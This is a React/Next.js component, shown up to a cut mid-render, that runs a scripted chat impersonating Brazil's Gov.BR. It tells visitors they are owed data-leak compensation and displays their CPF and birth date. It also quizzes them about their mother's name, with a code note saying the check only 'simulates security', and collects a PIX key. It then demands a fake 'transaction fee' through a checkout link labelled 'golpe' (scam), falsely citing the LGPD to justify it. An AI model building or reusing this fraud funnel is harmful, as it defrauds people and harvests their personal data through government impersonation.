
"use client";

import React, { useState, useEffect, useRef, FC } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send } from 'lucide-react';

export interface SimulatedChatParams {
  gclid?: string;
  utm_source?: string;
  utm_campaign?: string;
  utm_medium?: string;
  utm_content?: string;
  cpf?: string;
  nome?: string;
  mae?: string;
  nascimento?: string;
  typebotId?: string; // Added for Typebot ID from URL
  apiHost?: string; // Added for Typebot API Host from URL
}

interface ChatOption {
  text: string;
  nextStep?: string;
  action?: 'setChavePixToUserCPF' | 'redirectToPayment';
  paymentUrlTemplate?: string;
  style?: string;
}

interface FlowStepDataVideo {
  title?: string;
  message?: string;
  videoUrl: string; // Placeholder URL
  thumbnailText?: string;
}

interface FlowStepDataMultipleChoice {
  message: string;
  options: ChatOption[];
  note?: string;
  style?: string; // For the main button triggering options if it's a CTA
}

interface FlowStepDataLoading {
  message: string;
  duration_ms: number;
}

interface FlowStepDataDisplayMessage {
  title?: string;
  icon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
  message?: string;
  details?: Record<string, string>;
  audioUrl?: string;
  note?: string;
}

interface FlowStepDataTextInput {
  message: string;
  placeholder: string;
  variableToSet: 'chavePix';
  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens';
}

interface FlowStepDataDisplayImage {
    message: string;
    imageGenerationDetails?: {
        functionToCall: string;
        templateName: string;
        inputs: Record<string, string>;
        outputVariable: string;
    };
    fallbackImageUrl: string;
    imageAiHint?: string;
    imageAltText?: string;
}

interface FlowStep {
  type: 'videoDisplay' | 'multipleChoice' | 'loadingScreen' | 'displayMessage' | 'textInput' | 'displayImage' | 'simpleMessage';
  data: FlowStepDataVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayImage | { message: string };
  nextStep?: string;
  nextAction?: 'play_video_then_proceed';
  internalActions?: Record<string, { type: 'setVariable'; variableName: string; valueFrom: string }>;
  isTerminal?: boolean;
}

interface Message {
  id: string;
  sender: 'bot' | 'user';
  text?: string;
  options?: ChatOption[];
  displayTitle?: string;
  displayDetails?: Record<string, string>;
  displayIcon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
}


const funnelDefinition: Record<string, FlowStep> = {
    "step1_video_hook": {
      "type": "videoDisplay",
      "data": {
        "title": "Bem-vindo ao Atendimento Oficial Gov.BR!",
        "message": "Detectamos uma possível indenização vinculada ao seu CPF devido a recentes vazamentos de dados.\n\nPrimeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
        "videoUrl": "https://225412.b-cdn.net/Video%20Page.mp4", // Using a real placeholder
        "thumbnailText": "Clique para Assistir e Iniciar"
      },
      "nextAction": "play_video_then_proceed",
      "nextStep": "step2a_intro_message1"
    },
    "step2a_intro_message1": {
      "type": "simpleMessage",
      "data": {
        "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo."
      },
      "nextStep": "step2b_intro_message2"
    },
    "step2b_intro_message2": {
      "type": "simpleMessage",
      "data": {
        "message": "Responda às perguntas a seguir para aprovação do seu saque de {{indenizacaoValor}}."
      },
      "nextStep": "step2c_mother_name_check"
    },
    "step2c_mother_name_check": {
      "type": "multipleChoice",
      "data": {
        "message": "Por favor, confirme o nome completo de sua mãe:",
        "options": [
          {"text": "MARIA APARECIDA DA SILVA", "nextStep": "step3_ask_gov_app"},
          {"text": "ANA BEATRIZ PEREIRA SANTOS", "nextStep": "step3_ask_gov_app"},
          {"text": "{{motherName}}", "nextStep": "step3_ask_gov_app"},
          {"text": "RITA DE CÁSSIA OLIVEIRA", "nextStep": "step3_ask_gov_app"},
          {"text": "Nenhuma das alternativas.", "nextStep": "step3_ask_gov_app"}
        ],
        "note": "Independentemente da escolha, o fluxo avança. O objetivo é simular segurança."
      }
    },
    "step3_ask_gov_app": {
      "type": "multipleChoice",
      "data": {
        "message": "Você já instalou ou acessou o aplicativo GOV.BR no seu celular?",
        "options": [
          {"text": "Sim, já acessei/instalei", "nextStep": "step4_ask_civil_status"},
          {"text": "Não, nunca acessei/instalei", "nextStep": "step4_ask_civil_status"}
        ]
      }
    },
    "step4_ask_civil_status": {
      "type": "multipleChoice",
      "data": {
        "message": "Para finalizar a verificação de segurança, qual seu estado civil atual?",
        "options": [
          {"text": "Solteiro(a)", "nextStep": "step5_loading_validation"},
          {"text": "Casado(a)", "nextStep": "step5_loading_validation"},
          {"text": "Divorciado(a)", "nextStep": "step5_loading_validation"},
          {"text": "Viúvo(a)", "nextStep": "step5_loading_validation"},
          {"text": "União Estável", "nextStep": "step5_loading_validation"}
        ]
      }
    },
    "step5_loading_validation": {
      "type": "loadingScreen",
      "data": {
        "message": "Validando suas respostas e cruzando informações com a base de dados oficial... Por favor, aguarde.",
        "duration_ms": 3500
      },
      "nextStep": "step3b_confirmation_message"
    },
    "step3b_confirmation_message": {
      "type": "displayMessage",
      "data": {
        "title": "✅ Autenticidade Confirmada!",
        "icon": "success_checkmark_gov_style",
        "message": "Seus dados foram validados com sucesso em nosso sistema.",
        "details": {
          "Nome do Titular": "{{userName}}",
          "CPF": "{{userCPF}}",
          "Data de Nascimento": "{{userBirthDate}}",
          "Valor da Indenização Pré-Aprovada": "{{indenizacaoValor}}",
          "Status da Solicitação": "Pré-Aprovado",
          "Data da Consulta": "{{dataAtual}}"
        },
        "audioUrl": "https://url-do-golpista.com/audios/confirmacao_aprovada.mp3"
      },
      "nextStep": "step4_collect_pix_type"
    },
    "step4_collect_pix_type": {
      "type": "multipleChoice",
      "data": {
        "message": "Excelente, {{userName}}! Para qual tipo de chave PIX você gostaria de direcionar o valor de {{indenizacaoValor}}?",
        "options": [
          {"text": "CPF (Recomendado e mais rápido)", "action": "setChavePixToUserCPF", "nextStep": "step4d_confirm_pix_key"},
          {"text": "Telefone", "nextStep": "step4b_collect_pix_input_telefone"},
          {"text": "E-mail", "nextStep": "step4c_collect_pix_input_email"},
          {"text": "Chave Aleatória", "nextStep": "step4e_collect_pix_input_aleatoria"}
        ]
      },
      "internalActions": {
        "setChavePixToUserCPF": { "type": "setVariable", "variableName": "chavePix", "valueFrom": "userCPF" }
      }
    },
    "step4b_collect_pix_input_telefone": {
      "type": "textInput",
      "data": {
        "message": "Por favor, digite sua chave PIX (Telefone) no formato (XX) XXXXX-XXXX:",
        "placeholder": "(XX) XXXXX-XXXX",
        "variableToSet": "chavePix",
        "validation": "br_phone"
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4c_collect_pix_input_email": {
      "type": "textInput",
      "data": {
        "message": "Por favor, digite sua chave PIX (E-mail):",
        "placeholder": "seuemail@provedor.com",
        "variableToSet": "chavePix",
        "validation": "email"
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4e_collect_pix_input_aleatoria": {
      "type": "textInput",
      "data": {
        "message": "Por favor, digite sua chave PIX (Aleatória):",
        "placeholder": "Sua chave aleatória",
        "variableToSet": "chavePix",
        "validation": "alphanumeric_with_hyphens"
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4d_confirm_pix_key": {
      "type": "multipleChoice",
      "data": {
        "message": "⚠️ **ATENÇÃO!** Verifique cuidadosamente se a chave PIX está correta antes de prosseguir.\n\nChave PIX informada: **{{chavePix}}**\n\nO Governo Federal não se responsabiliza por transferências para chaves PIX informadas incorretamente.",
        "options": [
          {"text": "Sim, a chave PIX está correta.", "nextStep": "step9_registering_pix"},
          {"text": "Não, desejo corrigir a chave.", "nextStep": "step4_collect_pix_type"}
        ]
      }
    },
    "step9_registering_pix": {
      "type": "loadingScreen",
      "data": {
        "message": "Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema e preparando seu comprovante...",
        "duration_ms": 3000
      },
      "nextStep": "step10_pix_registered"
    },
    "step10_pix_registered": {
      "type": "displayMessage",
      "data": {
        "title": "Chave PIX Cadastrada com Sucesso!",
        "icon": "success_checkmark_gov_style",
        "message": "Sua chave PIX **{{chavePix}}** foi registrada e vinculada ao seu CPF para o recebimento da indenização.",
        "details": {
          "Nome do Titular": "{{userName}}",
          "CPF Vinculado": "{{userCPF}}",
          "Chave PIX para Recebimento": "{{chavePix}}",
          "Status da Chave": "ATIVA E VERIFICADA"
        },
        "audioUrl": "https://url-do-golpista.com/audios/pix_cadastrado.mp3"
      },
      "nextStep": "step11_ask_generate_receipt"
    },
    "step11_ask_generate_receipt": {
      "type": "multipleChoice",
      "data": {
        "message": "Agora vamos gerar seu comprovante oficial de recebimento do valor de {{indenizacaoValor}}.\n\nClique abaixo para confirmar e visualizar seu documento.",
        "options": [
          {"text": "Sim, desejo gerar e visualizar meu comprovante.", "nextStep": "step12_generate_receipt_loading"}
        ],
        "style": "primary_cta_button_gov_style"
      }
    },
    "step12_generate_receipt_loading": {
      "type": "loadingScreen",
      "data": {
        "message": "Gerando seu comprovante de recebimento dos valores... Isso pode levar alguns instantes.",
        "duration_ms": 2500
      },
      "nextStep": "step5b_display_receipt"
    },
    "step5b_display_receipt": {
      "type": "displayImage",
      "data": {
        "message": "Parabéns, {{userName}}! Seu comprovante de recebimento da indenização foi gerado com sucesso.\n\nChave PIX: **{{chavePix}}**\nValor: **{{indenizacaoValor}}**",
        "imageGenerationDetails": {
            "functionToCall": "generateReceiptImage",
            "templateName": "comprovante_template.png",
            "inputs": { "userName": "{{userName}}", "userCPF": "{{userCPF}}", "indenizacaoValor": "{{indenizacaoValor}}", "taxaValor": "{{taxaValor}}", "dataAtual": "{{dataAtual}}", "chavePix": "{{chavePix}}" },
            "outputVariable": "generatedReceiptImageUrl"
        },
        "fallbackImageUrl": "https://placehold.co/600x800.png?text=Comprovante+Indenização",
        "imageAiHint": "official government receipt document",
        "imageAltText": "Comprovante de Indenização Gov.BR"
      },
      "nextStep": "step6_reveal_tax"
    },
    "step6_reveal_tax": {
      "type": "displayMessage",
      "data": {
        "title": "RESUMO PARA LIBERAÇÃO IMEDIATA",
        "icon": "currency_dollar_gov_style",
        "details": {
          "Indenização Total Disponível para Saque": "{{indenizacaoValor}}",
          "Titular da Indenização": "{{userName}}",
          "CPF Vinculado": "{{userCPF}}",
          "Chave PIX Registrada para Recebimento": "{{chavePix}}",
          "Data da Solicitação": "{{dataAtual}}",
          "--------------------------------------": "--------------------------------------",
          "Taxa Única Transacional (Imposto de Saque Federal)": "**{{taxaValor}}**"
        },
        "note": "Esta taxa é referente aos custos operacionais e de segurança para a transferência eletrônica via PIX.",
        "audioUrl": "https://url-do-golpista.com/audios/explicacao_taxa.mp3"
      },
      "nextStep": "step7_justify_tax_cta"
    },
    "step7_justify_tax_cta": {
      "type": "multipleChoice",
      "data": {
        "message": "Prezado(a) {{userName}},\n\nSeu saldo de **{{indenizacaoValor}}** está pronto para ser transferido para a chave PIX **{{chavePix}}**.\n\nPara liberar o saque IMEDIATAMENTE, é necessário o pagamento da Taxa Única Transacional de **{{taxaValor}}**.\n\nConforme a Lei Geral de Proteção de Dados (LGPD, Lei n.º 13.709/2018), esta taxa não pode ser descontada diretamente do valor da indenização, pois o montante está vinculado e protegido em seu nome. O pagamento da taxa garante a segurança e a correta destinação dos fundos exclusivamente a você.",
        "options": [
          {
            "text": "✅ Sim! Quero pagar a taxa de {{taxaValor}} e receber meus {{indenizacaoValor}} AGORA!",
            "action": "redirectToPayment",
            "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&utm_source={{utm_source}}&utm_campaign={{utm_campaign}}&utm_medium={{utm_medium}}&utm_content={{utm_content}}&gclid={{gclid}}&param1={{userCPF}}&param2={{chavePix}}",
            "style": "primary_cta_button_gov_style"
          },
          {
            "text": "Tenho dúvidas sobre a taxa.",
            "nextStep": "step7b_explain_tax_more",
            "style": "secondary_link_button_gov_style"
          }
        ]
      }
    },
    "step7b_explain_tax_more": {
      "type": "multipleChoice",
      "data": {
        "message": "A Taxa Única Transacional de {{taxaValor}} cobre os custos de processamento seguro da sua indenização via PIX, incluindo tarifas bancárias e verificação anti-fraude, assegurando que o valor de {{indenizacaoValor}} chegue integralmente e com segurança à sua chave {{chavePix}}. Este é um procedimento padrão para garantir a conformidade com as regulamentações financeiras e a LGPD.\n\nO pagamento desta taxa é o último passo para você ter acesso imediato à sua indenização.",
        "options": [
          {
            "text": "Entendi. Pagar {{taxaValor}} e receber {{indenizacaoValor}}.",
            "action": "redirectToPayment",
            "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}",
            "style": "primary_cta_button_gov_style"
          },
          {
            "text": "Não quero pagar a taxa agora.",
            "nextStep": "step_end_no_payment",
            "style": "destructive_link_button_gov_style"
          }
        ]
      }
    },
    "step_end_no_payment": {
      "type": "displayMessage",
      "data": {
        "title": "Solicitação Pendente",
        "message": "Entendemos, {{userName}}. Sua solicitação de indenização de {{indenizacaoValor}} permanecerá pendente. Sem o pagamento da taxa transacional, não podemos prosseguir com a liberação dos fundos.\n\nVocê pode retornar a este atendimento a qualquer momento caso decida prosseguir. Lembramos que esta condição especial pode expirar.",
        "icon": "warning_amber_gov_style"
      },
      "isTerminal": true
    }
};

const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStepKey, setCurrentStepKey] = useState<string>("step1_video_hook");
  const [isBotTyping, setIsBotTyping] = useState(true);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);
  const router = useRouter();

  const [showVideoThumbnailOverlay, setShowVideoThumbnailOverlay] = useState(true);
  const [currentVideoMessage, setCurrentVideoMessage] = useState<string | null>(null);
  const [videoStepData, setVideoStepData] = useState<FlowStepDataVideo | null>(null);

  const [isLoadingStep, setIsLoadingStep] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState<string | null>(null);

  const [currentImageDetails, setCurrentImageDetails] = useState<{url: string; alt: string; message?: string, aiHint?: string} | null>(null);
  const [currentDisplayMessage, setCurrentDisplayMessage] = useState<Message | null>(null);
  
  const [flowVariables, setFlowVariables] = useState<Record<string, any>>({
    indenizacaoValor: "R$ 5.960,50",
    taxaValor: "R$ 61,90",
    chavePix: null,
    dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
    generatedReceiptImageUrl: null
  });

  const [isTextInputActive, setIsTextInputActive] = useState(false);
  const [currentTextInputConfig, setCurrentTextInputConfig] = useState<FlowStepDataTextInput | null>(null);
  const [textInputValue, setTextInputValue] = useState("");

  const prevCurrentStepKeyRef = useRef<string>();
  const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);

  const formatText = (text: string | undefined): string => {
    if (!text) return '';
    let formattedText = text;
    const allVars = {
        ...initialParams,
        ...flowVariables,
        userName: initialParams.nome || flowVariables.userName || 'Usuário',
        userCPF: initialParams.cpf || flowVariables.userCPF || '---.---.---.--',
        userBirthDate: initialParams.nascimento || flowVariables.userBirthDate || '--/--/----',
        motherName: initialParams.mae || flowVariables.motherName || 'Nome da Mãe Indisponível',
    };

    for (const key in allVars) {
      const placeholder = `{{${key}}}`;
      if (allVars[key as keyof typeof allVars] !== undefined && allVars[key as keyof typeof allVars] !== null) {
        let valueToInsert = String(allVars[key as keyof typeof allVars]);
        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) {
            valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        } else if (key === 'userCPF' && valueToInsert.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) {
            // Already formatted CPF
        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) { 
            const datePart = valueToInsert.split('T')[0];
            const parts = datePart.split('-');
            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{2}\/\d{2}\/\d{4}$/)) {
            // Already in dd/mm/yyyy, do nothing
        }
        formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
      }
    }
    return formattedText;
  };
  
  const formatDetailsObject = (details: Record<string, string> | undefined): Record<string, string> | undefined => {
    if (!details) return undefined;
    const formatted: Record<string, string> = {};
    for (const key in details) {
      formatted[formatText(key)] = formatText(details[key]);
    }
    return formatted;
  };

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isLoadingStep, currentImageDetails, currentDisplayMessage, videoStepData, isTextInputActive]);

  useEffect(() => {
    if (autoTransitionTimerRef.current) {
      clearTimeout(autoTransitionTimerRef.current);
      autoTransitionTimerRef.current = null;
    }

    const stepConfig = funnelDefinition[currentStepKey];
    if (!stepConfig) {
      console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
      setMessages(prev => [...prev, {id: `err-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro no fluxo."}]);
      setIsBotTyping(false);
      return;
    }
    
    const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
    if (isNewStep) {
      prevCurrentStepKeyRef.current = currentStepKey;
      setIsLoadingStep(false);
      setLoadingMessage(null);
      setCurrentImageDetails(null);
      setCurrentDisplayMessage(null);
      setIsTextInputActive(false);
      setCurrentTextInputConfig(null);
      if (stepConfig.type !== 'videoDisplay') {
        setVideoStepData(null);
        setCurrentVideoMessage(null);
      }
    }
    
    setIsBotTyping(true);

    const processStep = async () => {
      const botMessageId = `bot-${Date.now()}`;
      let nextStepTransitionDelay = 1200; 

      switch (stepConfig.type) {
        case 'videoDisplay': {
          const data = stepConfig.data as FlowStepDataVideo;
          if (isNewStep) {
            setVideoStepData(data);
            setCurrentVideoMessage(formatText(data.title || data.message));
            setShowVideoThumbnailOverlay(true);
          }
          setIsBotTyping(false);
          return; 
        }
        case 'simpleMessage': {
          const data = stepConfig.data as { message: string };
           if (isNewStep) {
            setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message) }]);
          }
          break;
        }
        case 'multipleChoice': {
          const data = stepConfig.data as FlowStepDataMultipleChoice;
          const formattedOptions = data.options.map(opt => ({
            ...opt,
            text: formatText(opt.text)
          }));
          if (isNewStep) {
            setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
          }
          break;
        }
        case 'loadingScreen': {
          const data = stepConfig.data as FlowStepDataLoading;
          if(isNewStep) {
            setLoadingMessage(formatText(data.message));
            setIsLoadingStep(true);
          }
          setIsBotTyping(false); 
          autoTransitionTimerRef.current = setTimeout(() => {
            if (prevCurrentStepKeyRef.current === currentStepKey) {
                setIsLoadingStep(false);
                setLoadingMessage(null);
                if (stepConfig.nextStep) {
                setCurrentStepKey(stepConfig.nextStep);
                }
            }
          }, data.duration_ms);
          return; 
        }
        case 'displayMessage': {
          const data = stepConfig.data as FlowStepDataDisplayMessage;
          const displayMsgData: Message = {
            id: botMessageId,
            sender: 'bot',
            displayTitle: formatText(data.title),
            text: data.message ? formatText(data.message) : undefined,
            displayDetails: formatDetailsObject(data.details),
            displayIcon: data.icon,
          };
          if (isNewStep) setCurrentDisplayMessage(displayMsgData);

          if (data.audioUrl && audioRef.current && isNewStep) { 
            audioRef.current.src = data.audioUrl;
            audioRef.current.play().catch(e => console.warn("Audio autoplay failed for step " + currentStepKey + ":", e));
          }
          nextStepTransitionDelay = data.details ? 4500 : (data.message ? 2500 : 1200);
          if (stepConfig.isTerminal) nextStepTransitionDelay = Infinity;
          break;
        }
        case 'textInput': {
            const data = stepConfig.data as FlowStepDataTextInput;
            if (isNewStep) {
                 setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message) }]);
            }
            setCurrentTextInputConfig(data);
            setIsTextInputActive(true);
            setTextInputValue("");
            setIsBotTyping(false);
            return;
        }
        case 'displayImage': {
          const data = stepConfig.data as FlowStepDataDisplayImage;
          if (isNewStep) {
             setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message) }]);
          }
           if (data.imageGenerationDetails && isNewStep) {
                setLoadingMessage(formatText("Gerando seu comprovante..."));
                setIsLoadingStep(true);
                setIsBotTyping(false);

                autoTransitionTimerRef.current = setTimeout(() => {
                  if (prevCurrentStepKeyRef.current === currentStepKey) {
                    setIsLoadingStep(false);
                    setLoadingMessage(null);
                    setFlowVariables(prev => ({...prev, [data.imageGenerationDetails!.outputVariable]: data.fallbackImageUrl}));
                    setCurrentImageDetails({url: data.fallbackImageUrl, alt: data.imageAltText || "Comprovante", aiHint: data.imageAiHint || 'document image'});
                    
                    if (stepConfig.nextStep) {
                        autoTransitionTimerRef.current = setTimeout(() => {
                             if (prevCurrentStepKeyRef.current === currentStepKey) setCurrentStepKey(stepConfig.nextStep as string);
                        }, 4000);
                    }
                  }
                }, 2000);
                return;
           } else {
             if(isNewStep) setCurrentImageDetails({url: data.fallbackImageUrl, alt: data.imageAltText || "Comprovante Gerado", aiHint: data.imageAiHint || 'document image'});
             nextStepTransitionDelay = 4000; 
           }
          break;
        }
        default:
          console.error("SimulatedChatFlow: Unknown step type:", (stepConfig as any).type);
          if (isNewStep) setMessages(prev => [...prev, {id: `err-type-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
      }

      setIsBotTyping(false);

      const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                stepConfig.type !== 'multipleChoice' &&
                                stepConfig.type !== 'videoDisplay' &&
                                stepConfig.type !== 'loadingScreen' &&
                                stepConfig.type !== 'textInput' &&
                                !(stepConfig.type === 'displayImage' && (stepConfig.data as FlowStepDataDisplayImage).imageGenerationDetails);

      if (canAutoTransition && isNewStep) { 
            autoTransitionTimerRef.current = setTimeout(() => {
            if (prevCurrentStepKeyRef.current === currentStepKey) {
               setCurrentStepKey(stepConfig.nextStep as string);
            }
          }, nextStepTransitionDelay);
      }
    };
    
    const appearanceDelay = (stepConfig.type === 'loadingScreen' || (isNewStep && currentStepKey === "step1_video_hook")) ? 0 : 700;
    
    if (isNewStep || stepConfig.type === 'loadingScreen') {
        setTimeout(processStep, appearanceDelay);
    } else { 
        setIsBotTyping(false);
    }

    return () => {
      if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
      }
    };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentStepKey, initialParams, flowVariables]);

  const handleOptionClick = (option: ChatOption) => {
    const userMessageId = `user-${Date.now()}`;
    // For options, we don't add a user message bubble, user "speaks" by clicking a bot's option.
    // setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: option.text }]);
    
    setCurrentDisplayMessage(null); 
    setCurrentImageDetails(null);

    const currentStepConfig = funnelDefinition[currentStepKey];

    if (option.action === 'setChavePixToUserCPF') {
        const cpfToSet = initialParams.cpf || flowVariables.userCPF || "CPF não disponível";
        setFlowVariables(prev => ({...prev, chavePix: cpfToSet}));
    } else if (currentStepConfig?.internalActions && option.action && currentStepConfig.internalActions[option.action]) {
        const actionDetail = currentStepConfig.internalActions[option.action];
        if (actionDetail.type === 'setVariable') {
            let valueFromSource = actionDetail.valueFrom; 
            let valueToSet = "";
            if (valueFromSource === "userCPF") valueToSet = initialParams.cpf || flowVariables.userCPF || "";
            else valueToSet = flowVariables[valueFromSource] || initialParams[valueFromSource as keyof SimulatedChatParams] || "";
            setFlowVariables(prev => ({ ...prev, [actionDetail.variableName]: valueToSet }));
        }
    }

    if (option.action === 'redirectToPayment' && option.paymentUrlTemplate) {
        let finalPaymentUrl = formatText(option.paymentUrlTemplate);
        
        const taxaValorCleaned = String(flowVariables.taxaValor || "0").replace("R$ ", "").replace(",", ".");
        const taxaValorNum = parseFloat(taxaValorCleaned);
        finalPaymentUrl = finalPaymentUrl.replace("{{taxaValor_cents}}", String(Math.round(taxaValorNum * 100)));
        
        const userNameEncoded = encodeURIComponent(initialParams.nome || flowVariables.userName || "");
        finalPaymentUrl = finalPaymentUrl.replace("{{userName_encoded}}", userNameEncoded);
        
        const userCPFNumbersOnly = (initialParams.cpf || flowVariables.userCPF || "").replace(/\D/g, '');
        finalPaymentUrl = finalPaymentUrl.replace("{{userCPF_numbers_only}}", userCPFNumbersOnly);

        try {
            const url = new URL(finalPaymentUrl);
             Object.entries(initialParams).forEach(([key, value]) => {
                if (value && !url.searchParams.has(key) && ['gclid', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content'].includes(key)) {
                    url.searchParams.set(key, value);
                }
            });
            window.location.href = url.toString();
        } catch (e) {
            console.error("Invalid payment URL:", finalPaymentUrl, e);
            setMessages(prev => [...prev, { id: `err-payment-url-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro ao tentar processar o pagamento. Verifique o link." }]);
        }
        return;
    }
    
    if (option.nextStep) {
      if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
      setCurrentStepKey(option.nextStep);
    } else if (!option.action) {
        console.warn("Option clicked with no nextStep and no action:", option);
    }
  };
  
  const handleVideoThumbnailClick = async () => {
    const stepConfig = funnelDefinition[currentStepKey];
    if (stepConfig?.type !== 'videoDisplay') return;

    setShowVideoThumbnailOverlay(false); 
    
    if (stepConfig.nextAction === "play_video_then_proceed" && stepConfig.nextStep) {
      if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current); 
      autoTransitionTimerRef.current = setTimeout(() => { 
        if(prevCurrentStepKeyRef.current === currentStepKey) setCurrentStepKey(stepConfig.nextStep as string);
      }, 500);
    }
  };

  const handleTextInputFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentTextInputConfig || !textInputValue.trim()) {
        setMessages(prev => [...prev, {id: `err-input-${Date.now()}`, sender: 'bot', text: "Por favor, preencha o campo."}]);
        return;
    }

    setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
    
    if (currentTextInputConfig.variableToSet === 'chavePix') {
        setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
    }

    setIsTextInputActive(false);
    setTextInputValue("");
    const nextStep = funnelDefinition[currentStepKey]?.nextStep;
    if (nextStep) {
        if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
        setCurrentStepKey(nextStep);
    }
  };

  const getIconComponent = (iconName?: string) => {
    if (!iconName) return null;
    if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: 'green', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: 'orange', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('currency_dollar')) return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0}}>💰</span>;
    return null;
  }


  return (
    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
      <audio ref={audioRef} style={{ display: 'none' }} />

      {videoStepData && (
        <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentVideoMessage && <p className="bot-message" style={{ background: '#f1f1f1', boxShadow: 'none', paddingLeft: 0, marginBottom: '10px', whiteSpace: 'pre-line' }}>{currentVideoMessage}</p>}
          <div
            onClick={handleVideoThumbnailClick}
            className="video-placeholder-wrapper"
            style={{
              position: 'relative', width: '100%', aspectRatio: '16/9',
              margin: '0 auto', borderRadius: '8px', overflow: 'hidden',
              backgroundColor: '#333', cursor: 'pointer'
            }}
          >
            {showVideoThumbnailOverlay && (
              <div
                style={{
                  position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
                  background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column',
                  justifyContent: 'center', alignItems: 'center', color: 'white', zIndex: 10
                }}
              >
                <VolumeX size={48} />
                <span style={{ marginTop: '10px', fontSize: '18px', textAlign: 'center' }}>
                  {(videoStepData as FlowStepDataVideo)?.thumbnailText || "Clique para Ouvir"}
                </span>
              </div>
            )}
             <div style={{display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100%', color: '#777'}}>
                { !showVideoThumbnailOverlay && <span style={{color: 'white'}}>Vídeo Iniciado (Simulado)</span> }
             </div>
          </div>
        </div>
      )}


      {isLoadingStep && loadingMessage && (
        <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
          <Loader2 className="animate-spin" size={32} style={{ margin: '0 auto 10px auto', color: '#1451b4' }} />
          <p style={{ fontSize: '16px', color: '#333', whiteSpace: 'pre-line' }}>{loadingMessage}</p>
        </div>
      )}

      {currentImageDetails && !isLoadingStep && (
        <div className="image-step-container" style={{ padding: '15px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentImageDetails.message && <p className="bot-message" style={{ background: '#f1f1f1', boxShadow: 'none', paddingLeft:0, marginBottom: '10px', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentImageDetails.message}}/>}
